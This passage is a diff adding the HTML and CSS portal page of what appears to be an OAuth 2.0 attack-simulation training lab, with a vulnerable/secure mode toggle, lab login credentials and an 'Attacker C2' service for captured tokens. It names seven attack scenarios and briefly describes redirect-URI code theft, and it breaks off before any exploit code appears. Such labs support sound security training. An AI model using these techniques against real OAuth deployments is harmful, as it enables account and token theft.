@@ -1,0 +1,1697 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OAuth Security Lab 🔐</title>
+<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&family=Courier+Prime:wght@400;700&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+a,button{text-decoration:none!important}
+
+/* ══ SCRAPBOOK THEME TOKENS ══ */
+:root {
+  --bg: #fdf6e3;
+  --paper: #fffef7;
+  --paper2: #fff9e8;
+  --ink: #2d2416;
+  --ink2: #5c4a2a;
+  --ink3: #9c8860;
+  --border: #d4b896;
+  --border2: #c4a070;
+  --red: #e05a3a;
+  --green: #3a9e6a;
+  --blue: #3a6eb5;
+  --orange: #d4852a;
+  --yellow: #e8c840;
+  --pink: #d45a8a;
+  --purple: #8855cc;
+  --tape: rgba(255,220,100,0.55);
+  --tape2: rgba(200,220,255,0.55);
+  --shadow: 3px 3px 0px #c4a070;
+  --shadow-sm: 2px 2px 0px #c4a070;
+  --nav-h: 58px;
+  --side-w: 230px;
+  --mono: 'Courier Prime', 'Courier New', monospace;
+  --sans: 'Nunito', system-ui, sans-serif;
+}
+[data-theme="dark"] {
+  --bg: #1a1612;
+  --paper: #221e18;
+  --paper2: #2a2520;
+  --ink: #f0e8d5;
+  --ink2: #c8b89a;
+  --ink3: #8a7860;
+  --border: #4a3c28;
+  --border2: #5c4a32;
+  --tape: rgba(180,160,60,0.35);
+  --tape2: rgba(100,120,180,0.35);
+  --shadow: 3px 3px 0px #0a0806;
+  --shadow-sm: 2px 2px 0px #0a0806;
+}
+
+/* ══ BASE ══ */
+html,body{height:100%;overflow:hidden}
+body{font-family:var(--sans);background:var(--bg);color:var(--ink);font-size:14px;line-height:1.6;transition:background .25s,color .25s}
+/* Paper texture via repeating pattern */
+body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:0;
+  background-image:repeating-linear-gradient(0deg,transparent,transparent 27px,rgba(180,140,80,0.06) 28px);
+  background-size:100% 28px;}
+
+::-webkit-scrollbar{width:6px;height:6px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px}
+
+/* ══ NAV ══ */
+#nav{
+  position:fixed;top:0;left:0;right:0;z-index:200;
+  height:var(--nav-h);background:var(--paper);
+  border-bottom:2px solid var(--border);
+  display:flex;align-items:center;padding:0 14px;gap:0;
+  box-shadow:0 2px 0px var(--border);
+}
+.nav-brand{
+  display:flex;align-items:center;gap:8px;
+  font-weight:900;font-size:15px;color:var(--ink);
+  cursor:pointer;white-space:nowrap;flex-shrink:0;margin-right:14px;
+  background:var(--yellow);border:2px solid var(--ink);padding:3px 10px;border-radius:4px;
+  box-shadow:var(--shadow-sm);transform:rotate(-1deg);transition:transform .15s;
+}
+.nav-brand:hover{transform:rotate(0deg) scale(1.02)}
+
+.nav-tabs{display:flex;align-items:center;gap:4px;overflow-x:auto;flex:1;padding:0 4px}
+.nav-tabs::-webkit-scrollbar{height:0}
+.ntab{
+  display:flex;align-items:center;gap:4px;padding:4px 9px;
+  border-radius:4px;font-size:12px;font-weight:700;color:var(--ink3);
+  cursor:pointer;white-space:nowrap;border:2px solid transparent;background:none;
+  transition:all .12s;font-family:var(--sans);
+}
+.ntab:hover{background:var(--paper2);color:var(--ink);border-color:var(--border);box-shadow:var(--shadow-sm)}
+.ntab.on{background:var(--paper2);color:var(--ink);border-color:var(--border2);box-shadow:var(--shadow-sm)}
+.ntab .pill{font-size:9px;font-weight:800;padding:1px 5px;border-radius:10px;border:1.5px solid}
+.p-hi{background:rgba(212,133,42,0.15);color:var(--orange);border-color:rgba(212,133,42,0.4)}
+.p-cr{background:rgba(224,90,58,0.15);color:var(--red);border-color:rgba(224,90,58,0.4)}
+
+.nav-right{display:flex;align-items:center;gap:6px;margin-left:auto;flex-shrink:0}
+
+.theme-btn{
+  display:flex;align-items:center;gap:4px;padding:4px 9px;
+  border-radius:4px;font-size:12px;font-weight:700;color:var(--ink2);
+  cursor:pointer;border:2px solid var(--border);background:var(--paper2);
+  box-shadow:var(--shadow-sm);transition:all .15s;font-family:var(--sans);
+}
+.theme-btn:hover{border-color:var(--border2);color:var(--ink);transform:translateY(-1px)}
+
+.mode-btn{
+  display:flex;align-items:center;gap:5px;padding:4px 10px;
+  border-radius:4px;font-size:11px;font-weight:800;font-family:var(--mono);
+  cursor:pointer;border:2px solid;transition:all .2s;box-shadow:var(--shadow-sm);
+}
+.mode-btn.vuln{background:rgba(224,90,58,.15);color:var(--red);border-color:var(--red)}
+.mode-btn.sec{background:rgba(58,158,106,.15);color:var(--green);border-color:var(--green)}
+.mode-btn:hover{transform:translateY(-1px)}
+.mdot{width:7px;height:7px;border-radius:50%;flex-shrink:0;animation:blink 2s infinite}
+.mdot.vuln{background:var(--red)}
+.mdot.sec{background:var(--green)}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+
+/* ══ SHELL ══ */
+#shell{display:flex;position:fixed;top:var(--nav-h);bottom:0;left:0;right:0;z-index:1}
+
+/* ══ SIDEBAR ══ */
+#sb{
+  width:var(--side-w);flex-shrink:0;
+  background:var(--paper);border-right:2px solid var(--border);
+  overflow-y:auto;padding:10px 0 40px;
+}
+.sb-lbl{font-size:9.5px;font-weight:800;color:var(--ink3);text-transform:uppercase;letter-spacing:.12em;padding:10px 12px 3px;font-family:var(--mono)}
+.sb-a{
+  display:flex;align-items:center;gap:7px;
+  padding:6px 12px;font-size:12.5px;font-weight:700;color:var(--ink2);
+  cursor:pointer;border-left:3px solid transparent;
+  transition:background .1s,color .1s,border-color .1s;
+}
+.sb-a:hover{background:var(--paper2);color:var(--ink)}
+.sb-a.on{background:var(--paper2);color:var(--blue);border-left-color:var(--blue)}
+.sb-ico{width:16px;text-align:center;flex-shrink:0;font-size:13px}
+.sb-pill{margin-left:auto;font-size:8.5px;font-weight:800;padding:1px 5px;border-radius:8px;border:1.5px solid;font-family:var(--mono)}
+.sb-div{height:2px;background:var(--border);margin:5px 12px;border-radius:1px}
+.ldot{display:inline-block;width:6px;height:6px;border-radius:50%;background:var(--green);animation:blink 2s infinite;vertical-align:middle;margin-right:2px}
+.ldot.r{background:var(--red)}
+
+/* ══ MAIN ══ */
+#main{flex:1;overflow-y:auto;overflow-x:hidden;background:var(--bg);transition:padding-bottom .22s;position:relative;z-index:1}
+.pg{display:none;padding:28px 36px 80px;max-width:900px}
+.pg.on{display:block}
+
+/* Full-width override */
+@media (min-width:1px) {
+  #main{width:100%}
+  .pg{max-width:100%;padding:28px 40px 100px}
+}
+
+/* ══ Typography ══ */
+h1{font-size:26px;font-weight:900;line-height:1.2;margin-bottom:8px;color:var(--ink)}
+h2{font-size:15px;font-weight:800;color:var(--ink);margin:28px 0 10px;padding-bottom:5px;border-bottom:2px dashed var(--border)}
+h3{font-size:13px;font-weight:700;color:var(--ink2);margin:16px 0 7px}
+p{color:var(--ink2);line-height:1.8;margin-bottom:12px}
+.eyebrow{font-size:10px;font-weight:800;font-family:var(--mono);color:var(--orange);text-transform:uppercase;letter-spacing:.15em;margin-bottom:4px}
+.lead{font-size:15px;color:var(--ink2);line-height:1.85;margin-bottom:22px;max-width:600px}
+
+/* ══ Sticker / badge elements ══ */
+.sticker{
+  display:inline-flex;align-items:center;gap:4px;
+  padding:3px 10px;border-radius:12px;font-size:10.5px;font-weight:800;
+  border:2px solid;box-shadow:var(--shadow-sm);font-family:var(--mono);
+  transform:rotate(-1deg);
+}
+.sticker-red{background:rgba(224,90,58,.12);color:var(--red);border-color:var(--red)}
+.sticker-green{background:rgba(58,158,106,.12);color:var(--green);border-color:var(--green)}
+.sticker-orange{background:rgba(212,133,42,.12);color:var(--orange);border-color:var(--orange)}
+.sticker-blue{background:rgba(58,110,181,.12);color:var(--blue);border-color:var(--blue)}
+
+/* ══ Section divider ══ */
+.div-row{display:flex;align-items:center;gap:10px;margin:24px 0 14px}
+.div-lbl{font-size:10px;font-weight:800;color:var(--ink3);text-transform:uppercase;letter-spacing:.12em;white-space:nowrap;font-family:var(--mono)}
+.div-line{flex:1;height:2px;background:repeating-linear-gradient(90deg,var(--border) 0,var(--border) 4px,transparent 4px,transparent 8px)}
+
+/* ══ Code blocks ══ */
+.cb{
+  background:var(--paper);border:2px solid var(--border);border-radius:6px;
+  margin:6px 0 16px;overflow:hidden;box-shadow:var(--shadow);
+}
+.cb-head{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:5px 11px;background:var(--paper2);border-bottom:2px solid var(--border);
+  font-size:10px;font-weight:800;color:var(--ink3);font-family:var(--mono);
+  text-transform:uppercase;letter-spacing:.06em;
+}
+.cb-acts{display:flex;align-items:center;gap:5px}
+.btn-copy,.btn-run,.btn-open{
+  padding:2px 8px;border-radius:3px;font-size:10.5px;font-weight:800;
+  cursor:pointer;transition:all .12s;font-family:var(--mono);border:2px solid;
+}
+.btn-copy{background:var(--paper2);color:var(--ink2);border-color:var(--border)}
+.btn-copy:hover{border-color:var(--border2);box-shadow:var(--shadow-sm);transform:translateY(-1px)}
+.btn-copy.ok{background:rgba(58,158,106,.12);color:var(--green);border-color:var(--green)}
+.btn-run{background:rgba(58,110,181,.1);color:var(--blue);border-color:var(--blue)}
+.btn-run:hover{background:rgba(58,110,181,.2);box-shadow:var(--shadow-sm);transform:translateY(-1px)}
+.btn-run:disabled{opacity:.35;cursor:default;transform:none;box-shadow:none}
+.btn-open{background:var(--paper2);color:var(--ink2);border-color:var(--border)}
+.btn-open:hover{border-color:var(--border2);box-shadow:var(--shadow-sm);transform:translateY(-1px)}
+pre.cc{
+  padding:13px 15px;font-family:var(--mono);font-size:12px;
+  color:var(--blue);line-height:1.7;overflow-x:auto;white-space:pre-wrap;word-break:break-word;margin:0;
+}
+[data-theme="dark"] pre.cc{color:#7ab8f5}
+code{
+  font-family:var(--mono);font-size:11.5px;
+  background:rgba(58,110,181,0.08);color:var(--blue);
+  padding:1px 5px;border-radius:3px;border:1.5px solid rgba(58,110,181,0.2);
+}
+pre.cc code{background:none;padding:0;border:none;font-size:inherit;color:inherit}
+
+/* ══ Callouts ══ */
+.note{border-radius:5px;padding:10px 13px;font-size:12.5px;line-height:1.7;margin:8px 0 14px;display:flex;gap:10px;align-items:flex-start;border:2px solid;box-shadow:var(--shadow-sm)}
+.note-ico{flex-shrink:0;font-size:15px;margin-top:1px}
+.note.rd{background:rgba(224,90,58,.06);border-color:var(--red);color:var(--red)}
+.note.gn{background:rgba(58,158,106,.06);border-color:var(--green);color:var(--green)}
+.note.bl{background:rgba(58,110,181,.06);border-color:var(--blue);color:var(--blue)}
+.note.yw{background:rgba(212,133,42,.06);border-color:var(--orange);color:var(--orange)}
+
+/* ══ Diff ══ */
+.diff{border:2px solid var(--border);border-radius:6px;overflow:hidden;margin:10px 0 18px;box-shadow:var(--shadow)}
+.dh{padding:6px 13px;font-size:10px;font-weight:800;font-family:var(--mono);text-transform:uppercase;letter-spacing:.04em;display:flex;align-items:center;gap:6px}
+.dh.v{background:rgba(224,90,58,.1);color:var(--red);border-bottom:1.5px solid rgba(224,90,58,.3)}
+.dh.s{background:rgba(58,158,106,.1);color:var(--green);border-top:2px solid var(--border);border-bottom:1.5px solid rgba(58,158,106,.3)}
+.dc{padding:11px 15px;font-family:var(--mono);font-size:12px;line-height:1.7;overflow-x:auto;white-space:pre}
+.dc.v{background:rgba(224,90,58,.04);color:var(--red)}
+.dc.s{background:rgba(58,158,106,.04);color:var(--green)}
+[data-theme="dark"] .dc.v{background:rgba(224,90,58,.1)}
+[data-theme="dark"] .dc.s{background:rgba(58,158,106,.1)}
+
+/* ══ Tables ══ */
+table{width:100%;border-collapse:collapse;font-size:13px;margin:7px 0 18px;border:2px solid var(--border);border-radius:6px;overflow:hidden;box-shadow:var(--shadow)}
+thead th{background:var(--paper2);color:var(--ink3);font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:.08em;padding:8px 11px;text-align:left;border-bottom:2px solid var(--border);font-family:var(--mono)}
+tbody td{padding:8px 11px;border-bottom:1.5px solid var(--border);color:var(--ink2);vertical-align:top}
+tbody tr:last-child td{border-bottom:none}
+tbody tr:hover td{background:var(--paper2)}
+
+/* ══ Steps ══ */
+.steps{list-style:none;counter-reset:s;padding:0;margin:10px 0}
+.steps li{counter-increment:s;display:flex;gap:13px;padding:14px 0;border-bottom:2px dashed var(--border);font-size:13px;color:var(--ink2);line-height:1.75}
+.steps li:last-child{border-bottom:none}
+.sn{flex-shrink:0;width:26px;height:26px;border-radius:50%;background:var(--blue);color:#fff;font-size:11px;font-weight:800;display:flex;align-items:center;justify-content:center;margin-top:2px;border:2px solid var(--ink);box-shadow:var(--shadow-sm);font-family:var(--mono)}
+.sc{flex:1}
+.sc p{margin-bottom:7px}
+
+/* ══ Example snippet (what it looks like) ══ */
+.example-box{
+  border:2px dashed var(--orange);background:rgba(212,133,42,.05);
+  border-radius:6px;padding:10px 13px;margin:8px 0 12px;
+  font-family:var(--mono);font-size:11.5px;color:var(--ink2);line-height:1.6;
+}
+.example-box .ex-label{font-size:9.5px;font-weight:800;color:var(--orange);text-transform:uppercase;letter-spacing:.1em;margin-bottom:4px;display:block}
+
+/* ══ Attack hero card ══ */
+.atk-hero{
+  border:2px solid var(--border);border-left:4px solid var(--red);
+  background:var(--paper);border-radius:6px;padding:20px 22px;margin-bottom:26px;
+  box-shadow:var(--shadow);position:relative;
+}
+/* Tape decoration */
+.atk-hero::before{
+  content:'✂ ─ ─ ─';position:absolute;top:-1px;right:20px;
+  font-size:9px;color:var(--border2);font-family:var(--mono);
+  background:var(--tape);padding:1px 6px;border-radius:0 0 4px 4px;
+}
+.hero-row{display:flex;align-items:flex-start;gap:13px;margin-bottom:10px}
+.hero-n{font-size:38px;font-weight:900;color:var(--red);font-family:var(--mono);line-height:1;flex-shrink:0;opacity:.35}
+.hero-title{font-size:20px;font-weight:900;color:var(--ink)}
+.hero-sub{font-size:12.5px;color:var(--ink2);margin-top:4px;line-height:1.65}
+.hero-meta{display:flex;align-items:center;gap:7px;flex-wrap:wrap}
+.sev{font-size:10px;font-weight:800;padding:2px 7px;border-radius:10px;border:2px solid;font-family:var(--mono);box-shadow:var(--shadow-sm)}
+.sev-hi{background:rgba(212,133,42,.12);color:var(--orange);border-color:var(--orange)}
+.sev-cr{background:rgba(224,90,58,.12);color:var(--red);border-color:var(--red)}
+.fbadge{font-size:10px;padding:2px 7px;border-radius:3px;background:var(--paper2);color:var(--ink3);font-family:var(--mono);border:2px solid var(--border)}
+
+/* ══ Service cards ══ */
+.svc-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(175px,1fr));gap:10px;margin:3px 0 22px}
+.svc-card{
+  background:var(--paper);border:2px solid var(--border);border-radius:6px;
+  padding:14px;transition:all .15s;display:block;box-shadow:var(--shadow);
+}
+.svc-card:hover{border-color:var(--border2);transform:translate(-1px,-1px);box-shadow:4px 4px 0px var(--border)}
+.svc-icon{font-size:20px;margin-bottom:7px}
+.svc-name{font-size:13px;font-weight:800;color:var(--ink);margin-bottom:3px}
+.svc-desc{font-size:11px;color:var(--ink3);line-height:1.5}
+.svc-url{font-size:10px;font-family:var(--mono);color:var(--blue);margin-top:7px;word-break:break-all}
+
+/* ══ Attack rows ══ */
+.atk-list{display:flex;flex-direction:column;gap:7px;margin:3px 0 22px}
+.atk-row{
+  display:flex;align-items:center;gap:11px;
+  background:var(--paper);border:2px solid var(--border);
+  border-radius:6px;padding:12px 14px;
+  cursor:pointer;transition:all .15s;box-shadow:var(--shadow);
+}
+.atk-row:hover{border-color:var(--border2);transform:translate(-1px,-1px);box-shadow:4px 4px 0px var(--border)}
+.arow-n{width:30px;height:30px;border-radius:6px;background:var(--paper2);font-weight:900;font-size:13px;font-family:var(--mono);color:var(--ink);display:flex;align-items:center;justify-content:center;flex-shrink:0;border:2px solid var(--border)}
+.arow-info{flex:1}
+.arow-title{font-size:13px;font-weight:800;color:var(--ink)}
+.arow-sub{font-size:11px;color:var(--ink3);margin-top:2px;line-height:1.4}
+.arow-r{display:flex;align-items:center;gap:6px;flex-shrink:0}
+
+/* ══ Mode card ══ */
+.mode-card{background:var(--paper);border:2px solid var(--border);border-radius:6px;padding:16px 18px;display:flex;align-items:center;justify-content:space-between;gap:14px;flex-wrap:wrap;box-shadow:var(--shadow)}
+.mode-card-status{font-size:13px;font-weight:800;margin-bottom:3px}
+.mode-card-desc{font-size:12px;color:var(--ink2);line-height:1.65;max-width:470px}
+.toggle-btn{padding:8px 16px;border-radius:5px;font-size:12.5px;font-weight:800;cursor:pointer;border:2px solid;white-space:nowrap;transition:all .15s;box-shadow:var(--shadow-sm);font-family:var(--sans)}
+.toggle-btn:hover{transform:translate(-1px,-1px);box-shadow:3px 3px 0px}
+
+/* ══ Checklists ══ */
+.chk{list-style:none;padding:0;margin:7px 0 18px}
+.chk li{display:flex;gap:10px;padding:6px 0;font-size:12.5px;color:var(--ink2);border-bottom:1.5px dashed var(--border)}
+.chk li:last-child{border-bottom:none}
+.chk li::before{content:'☐';color:var(--blue);font-size:14px;flex-shrink:0;font-weight:700}
+
+/* ══ Link list ══ */
+.llist{display:flex;flex-direction:column;gap:6px}
+.lrow{display:flex;align-items:center;justify-content:space-between;background:var(--paper);border:2px solid var(--border);border-radius:5px;padding:8px 12px;transition:all .15s;gap:12px;cursor:pointer;box-shadow:var(--shadow-sm)}
+.lrow:hover{border-color:var(--border2);transform:translate(-1px,-1px);box-shadow:3px 3px 0px var(--border)}
+.lrow-lbl{font-size:12.5px;color:var(--ink);font-weight:700}
+.lrow-url{font-family:var(--mono);font-size:10px;color:var(--ink3);word-break:break-all;text-align:right}
+
+/* ══ Getting started box ══ */
+.gs-box{background:var(--paper);border:2px solid var(--border);border-radius:6px;padding:16px 18px;margin-bottom:18px;box-shadow:var(--shadow)}
+.gs-box h3{font-size:13px;font-weight:800;color:var(--ink);margin-bottom:10px}
+
+/* ══ Inline code with auto-fill highlight ══ */
+.auto-fill{background:rgba(58,110,181,.12);color:var(--blue);border:1.5px dashed var(--blue);padding:1px 5px;border-radius:3px;font-family:var(--mono);font-size:11px;font-weight:700}
+.placeholder{background:rgba(212,133,42,.1);color:var(--orange);border:1.5px dashed var(--orange);padding:1px 5px;border-radius:3px;font-family:var(--mono);font-size:11px;font-weight:700}
+
+/* ══ Console ══ */
+#con{
+  position:fixed;bottom:0;left:var(--side-w);right:0;height:0;
+  background:var(--paper);border-top:2px solid var(--border);
+  transition:height .22s ease;z-index:100;
+  display:flex;flex-direction:column;overflow:hidden;
+}
+#con.open{height:280px}
+#con-hd{display:flex;align-items:center;justify-content:space-between;padding:0 13px;height:34px;background:var(--paper2);border-bottom:2px solid var(--border);flex-shrink:0}
+#con-title{font-size:11px;font-weight:800;font-family:var(--mono);color:var(--ink2);display:flex;align-items:center;gap:7px}
+#con-hint{font-size:9.5px;color:var(--ink3);font-weight:400}
+#con-x{background:none;border:none;color:var(--ink3);font-size:15px;cursor:pointer;padding:0 2px;line-height:1;font-family:var(--sans)}
+#con-x:hover{color:var(--ink)}
+#con-out{flex:1;overflow-y:auto;overflow-x:auto;padding:7px 13px;font-family:var(--mono);font-size:11px;line-height:1.65;color:var(--ink2);white-space:pre-wrap;word-break:break-word}
+#con-row{display:flex;align-items:center;border-top:2px solid var(--border);flex-shrink:0}
+#con-ps{color:var(--blue);font-family:var(--mono);font-size:12px;padding:0 6px 0 13px;font-weight:700}
+#con-in{flex:1;background:none;border:none;outline:none;font-family:var(--mono);font-size:12px;color:var(--ink);padding:6px 0;caret-color:var(--blue)}
+#con-go{padding:4px 13px;margin:3px;background:rgba(58,110,181,.1);color:var(--blue);border:2px solid var(--blue);border-radius:4px;font-size:11px;font-family:var(--mono);cursor:pointer;transition:all .12s;font-weight:700}
+#con-go:hover{background:rgba(58,110,181,.2)}
+.cl{margin-bottom:1px}
+.cl.cmd{color:var(--blue)}
+.cl.ok{color:var(--green)}
+.cl.er{color:var(--red)}
+.cl.dim{color:var(--ink3)}
+.cl.js{color:var(--purple)}
+
+.con-fab{
+  position:fixed;bottom:14px;right:18px;z-index:300;
+  display:flex;align-items:center;gap:6px;padding:7px 14px;
+  border-radius:20px;background:var(--paper);border:2px solid var(--border);
+  color:var(--ink2);font-size:12px;font-family:var(--mono);cursor:pointer;
+  box-shadow:var(--shadow);transition:all .12s;font-weight:700;
+}
+.con-fab:hover{border-color:var(--blue);color:var(--blue);transform:translate(-1px,-1px);box-shadow:4px 4px 0px var(--border)}
+
+.pgfoot{margin-top:48px;padding-top:14px;border-top:2px dashed var(--border);font-size:11px;color:var(--ink3);display:flex;justify-content:space-between}
+.pgfoot a{color:var(--ink2);font-weight:700}
+
+/* ══ Responsive ══ */
+#ham-btn{
+  display:none;width:34px;height:34px;border:2px solid var(--border);border-radius:5px;
+  background:var(--paper);cursor:pointer;flex-direction:column;align-items:center;
+  justify-content:center;gap:4px;padding:0;flex-shrink:0;
+}
+#ham-btn span{display:block;width:16px;height:2px;background:var(--ink2);border-radius:2px;transition:all .2s}
+#sb-overlay{
+  display:none;position:fixed;inset:0;background:rgba(45,36,22,.4);z-index:299;
+}
+@media (max-width:860px){
+  #ham-btn{display:flex}
+  #sb{
+    position:fixed;top:var(--nav-h);left:-100%;bottom:0;
+    width:min(260px,85vw);z-index:300;
+    transition:left .22s ease;box-shadow:none;
+  }
+  #sb.open{left:0;box-shadow:4px 0 20px rgba(45,36,22,.15)}
+  #sb-overlay.open{display:block}
+  #main{width:100%}
+  .pg{padding:18px 14px 80px;max-width:100%}
+  #con{left:0!important;right:0!important;width:100%!important;border-radius:0}
+  .nav-brand{font-size:12px;padding:3px 8px}
+  #themeBtn{display:none}
+  .svc-grid{grid-template-columns:1fr 1fr!important}
+  .atk-row{flex-wrap:wrap;gap:6px}
+  table{display:block;overflow-x:auto;-webkit-overflow-scrolling:touch}
+  .paste-row{flex-wrap:wrap}
+  .paste-row input{min-width:0;width:100%}
+}
+@media (max-width:480px){
+  h1{font-size:20px}
+  .svc-grid{grid-template-columns:1fr!important}
+  .pg{padding:14px 10px 80px}
+  .nav-brand{font-size:11px;padding:2px 6px}
+  #modeBtn{font-size:9px;padding:3px 7px}
+  #mlbl{display:none}
+  .paste-row{flex-direction:column;align-items:stretch;gap:5px}
+  .paste-row label{white-space:normal}
+  .example-box{font-size:10px}
+  .cb pre.cc{font-size:10px}
+}
+.paste-row{display:flex;align-items:center;gap:7px;margin:-10px 0 10px;padding:6px 12px 8px;
+  background:rgba(212,133,42,.06);border:1.5px dashed var(--orange);border-radius:0 0 5px 5px;
+  font-size:11px;color:var(--orange);font-family:var(--mono)}
+.paste-row label{font-weight:700;white-space:nowrap;flex-shrink:0}
+.paste-row input{flex:1;background:var(--paper);border:1.5px solid var(--border2);border-radius:3px;
+  padding:3px 7px;font-family:var(--mono);font-size:11px;color:var(--ink);outline:none;min-width:0}
+.paste-row input:focus{border-color:var(--orange)}
+.paste-row .apply-btn{padding:2px 9px;background:var(--orange);color:#fff;border:none;border-radius:3px;
+  font-size:10px;font-weight:800;cursor:pointer;font-family:var(--mono);white-space:nowrap;flex-shrink:0}
+.paste-row .apply-btn:hover{opacity:.85}
+.pr-filled{background:rgba(58,158,106,.06);border-color:var(--green);color:var(--green)}
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<div id="sb-overlay" onclick="closeSb()"></div>
+
+<nav id="nav">
+  <button id="ham-btn" onclick="toggleSb()" aria-label="Menu">
+    <span></span><span></span><span></span>
+  </button>
+  <div class="nav-brand" onclick="nav('home')">
+    🔐 OAuth Lab
+  </div>
+
+  <div class="nav-tabs"></div>
+
+  <div class="nav-right">
+    <button class="theme-btn" id="themeBtn" onclick="toggleTheme()">🌙 Dark</button>
+    <button id="modeBtn" class="mode-btn vuln" onclick="doToggle()">
+      <span id="mdot" class="mdot vuln"></span>
+      <span id="mlbl">VULNERABLE</span>
+    </button>
+  </div>
+</nav>
+
+<!-- SHELL -->
+<div id="shell">
+
+<!-- SIDEBAR -->
+<aside id="sb">
+  <div class="sb-lbl">Lab</div>
+  <div class="sb-a" data-p="ref"><span class="sb-ico">⚡</span>Quick Start</div>
+  <div class="sb-div"></div>
+  <div class="sb-lbl">Attack Scenarios</div>
+  <div class="sb-a" data-p="a1"><span class="sb-ico">🎯</span>1 · Redirect URI<span class="sb-pill p-hi">HIGH</span></div>
+  <div class="sb-a" data-p="a2"><span class="sb-ico">🎯</span>2 · PKCE Bypass<span class="sb-pill p-hi">HIGH</span></div>
+  <div class="sb-a" data-p="a3"><span class="sb-ico">🎯</span>3 · XSS Leakage<span class="sb-pill p-hi">HIGH</span></div>
+  <div class="sb-a" data-p="a4"><span class="sb-ico">🎯</span>4 · Consent Abuse<span class="sb-pill p-hi">HIGH</span></div>
+  <div class="sb-a" data-p="a5"><span class="sb-ico">🎯</span>5 · Refresh Abuse<span class="sb-pill p-cr">CRIT</span></div>
+  <div class="sb-a" data-p="a6"><span class="sb-ico">🎯</span>6 · Scope Escalation<span class="sb-pill p-hi">HIGH</span></div>
+  <div class="sb-a" data-p="a7"><span class="sb-ico">🎯</span>7 · JWT alg=none<span class="sb-pill p-cr">CRIT</span></div>
+  <div class="sb-div"></div>
+  <div class="sb-lbl">Documentation</div>
+  <div class="sb-a" data-p="arch"><span class="sb-ico">🏗</span>Architecture</div>
+  <div class="sb-a" data-p="def"><span class="sb-ico">🛡</span>Defense Guide</div>
+  <div class="sb-div"></div>
+  <div class="sb-lbl">Services</div>
+  <a class="sb-a" id="sb-client" href="/" target="_blank"><span class="sb-ico">🌐</span>Client App<span class="ldot" style="margin-left:auto"></span></a>
+  <a class="sb-a" id="sb-auth"   href="#" target="_blank"><span class="sb-ico">🔑</span>Auth Server<span class="ldot" style="margin-left:auto"></span></a>
+  <a class="sb-a" id="sb-res"    href="#" target="_blank"><span class="sb-ico">🛡</span>Resource API<span class="ldot" style="margin-left:auto"></span></a>
+  <a class="sb-a" id="sb-atk"   href="#" target="_blank"><span class="sb-ico">💀</span>Attacker C2<span class="ldot r" style="margin-left:auto"></span></a>
+  <a class="sb-a" id="sb-mon"    href="#" target="_blank"><span class="sb-ico">📊</span>Monitoring<span class="ldot" style="margin-left:auto"></span></a>
+</aside>
+
+<!-- MAIN -->
+<main id="main">
+
+<!-- ══ HOME ══ -->
+<div class="pg on" id="pg-home">
+  <div class="eyebrow">Security Research Lab</div>
+  <h1>OAuth 2.0 Attack Simulation Lab 🔐</h1>
+  <p class="lead">Seven real-world OAuth vulnerabilities — each with a live exploit, step-by-step walkthrough, and working mitigation. Toggle <strong>VULNERABLE / SECURE</strong> without restarting Docker.</p>
+
+  <div class="div-row"><span class="div-lbl">Getting Started</span><span class="div-line"></span></div>
+  <div class="gs-box">
+    <h3>📋 How to use this lab</h3>
+    <ol class="steps">
+      <li><span class="sn">1</span><div class="sc"><p>Check the top-right badge — it shows the current mode. In <strong>VULNERABLE</strong> mode all 7 attacks work. In <strong>SECURE</strong> mode all mitigations are active. Click the badge to toggle — no Docker restart needed.</p></div></li>
+      <li><span class="sn">2</span><div class="sc"><p>Log in to the Client App as <code>alice / password123</code> first. This creates real tokens in localStorage that the labs will auto-fill. Open it in a new tab so you can switch back to this portal.</p></div></li>
+      <li><span class="sn">3</span><div class="sc"><p>Open <a id="gs-mon-link" href="#" target="_blank" style="color:var(--blue);font-weight:700">📊 Monitoring Dashboard</a> in a separate tab — security events appear live as attacks fire.</p></div></li>
+      <li><span class="sn">4</span><div class="sc"><p>Pick an attack from the sidebar. Each page explains how the vulnerability works, gives step-by-step instructions, and has ▶ Run buttons that fire requests automatically with real URLs and codes filled in.</p></div></li>
+    </ol>
+  </div>
+
+  <div class="div-row"><span class="div-lbl">Lab Services</span><span class="div-line"></span></div>
+  <div class="svc-grid">
+    <a class="svc-card" id="sc-client" href="/login" target="_blank">
+      <div class="svc-icon">🌐</div>
+      <div class="svc-name">Client App</div>
+      <div class="svc-desc">Start here. Log in to begin an OAuth flow.</div>
+      <div class="svc-url"><span class="ldot"></span><span id="u-client">…</span>/login</div>
+    </a>
+    <a class="svc-card" id="sc-auth" href="#" target="_blank">
+      <div class="svc-icon">🔑</div>
+      <div class="svc-name">Auth Server</div>
+      <div class="svc-desc">Issues authorization codes and JWTs.</div>
+      <div class="svc-url"><span class="ldot"></span><span id="u-auth">…</span></div>
+    </a>
+    <a class="svc-card" id="sc-res" href="#" target="_blank">
+      <div class="svc-icon">🛡</div>
+      <div class="svc-name">Resource API</div>
+      <div class="svc-desc">Protected API — validates JWTs and scopes.</div>
+      <div class="svc-url"><span class="ldot"></span><span id="u-res">…</span></div>
+    </a>
+    <a class="svc-card" id="sc-atk" href="#" target="_blank">
+      <div class="svc-icon">💀</div>
+      <div class="svc-name">Attacker C2</div>
+      <div class="svc-desc">Captures stolen codes and tokens.</div>
+      <div class="svc-url"><span class="ldot r"></span><span id="u-atk">…</span></div>
+    </a>
+    <a class="svc-card" id="sc-mon" href="#" target="_blank">
+      <div class="svc-icon">📊</div>
+      <div class="svc-name">Monitoring</div>
+      <div class="svc-desc">Real-time security event dashboard.</div>
+      <div class="svc-url"><span class="ldot"></span><span id="u-mon">…</span></div>
+    </a>
+  </div>
+
+  <div class="div-row"><span class="div-lbl">7 Attack Scenarios</span><span class="div-line"></span></div>
+  <div class="atk-list">
+    <div class="atk-row" data-p="a1">
+      <div class="arow-n">1</div>
+      <div class="arow-info"><div class="arow-title">Redirect URI Manipulation</div><div class="arow-sub">Prefix matching lets attacker steal the authorization code by redirecting to their server</div></div>
